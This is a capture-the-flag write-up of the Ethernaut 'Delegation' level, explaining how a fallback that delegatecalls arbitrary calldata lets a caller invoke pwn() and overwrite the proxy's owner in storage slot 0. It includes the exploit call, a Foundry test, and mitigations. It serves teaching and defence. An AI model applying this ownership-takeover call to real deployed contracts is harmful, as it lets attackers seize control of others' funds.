# 06. Delegation

[English](06_Delegation.md) | [한국어](../ko/06_Delegation.md)

## Objective

Claim ownership of the `Delegation` contract.

## Key Concepts

- `delegatecall`
- Fallback functions
- Function selectors and calldata
- Storage layout compatibility
- Preserved `msg.sender`

## Contract Analysis

`Delegation` forwards every unknown call to `Delegate`:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

The implementation exposes a function that replaces its owner with the caller:

```solidity
function pwn() public {
    owner = msg.sender;
}
```

`delegatecall` executes `Delegate` code in the storage context of `Delegation`. It also preserves the original caller, so `msg.sender` inside the delegated `pwn()` remains the player.

Both contracts place `owner` in storage slot 0. Consequently, the assignment compiled for `Delegate.owner` writes to slot 0 of `Delegation`, replacing the target's owner.

## Solution Flow

The player sends calldata containing the selector for `pwn()` to `Delegation`:

```solidity
address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));
```

Because `Delegation` does not define `pwn()`, its fallback function runs and forwards the same calldata through `delegatecall`.

```text
player calls Delegation with pwn() selector
        ↓
Delegation.fallback() executes
        ↓
delegatecall runs Delegate.pwn() code
        ↓
msg.sender remains player
        ↓
slot 0 of Delegation is assigned player
        ↓
Delegation.owner == player
```

## Foundry Test

The test verifies that the proxy's state changes while the implementation's state remains untouched:

```solidity
vm.prank(player);
(bool success,) = address(delegation).call(
    abi.encodeWithSelector(Delegate.pwn.selector)
);

assertTrue(success);
assertEq(delegation.owner(), player);
assertEq(delegate.owner(), initialDelegateOwner);
```

Using `abi.encodeWithSelector(Delegate.pwn.selector)` keeps the selector tied to the compiled function declaration and avoids a manually maintained signature string.

## Root Cause

The fallback function delegates arbitrary caller-controlled calldata without restricting which implementation functions may execute. The implementation's storage layout overlaps security-critical state in the forwarding contract, allowing a public function to overwrite ownership.

The fallback also ignores failed delegated calls instead of propagating their revert data, which makes failures harder for callers to detect.

## Recommended Mitigations

- Do not delegate arbitrary calldata to an implementation that exposes unsafe public functions.
- Restrict upgrades and privileged operations with explicit access control.
- Keep proxy and implementation storage layouts intentionally compatible.
- Use established proxy standards and audited libraries.
- Propagate revert data when a delegated call fails.
- Test both the proxy's state and the implementation's unchanged state.

## Run the Test

```bash
forge test --match-path test/06_Delegation.t.sol -vvv
```

For the complete delegatecall trace:

```bash
forge test --match-path test/06_Delegation.t.sol -vvvv
```

## Takeaway

`delegatecall` borrows another contract's code but keeps the caller, balance, and storage of the calling contract. A safe design must treat calldata exposure and storage layout as part of its authorization model.
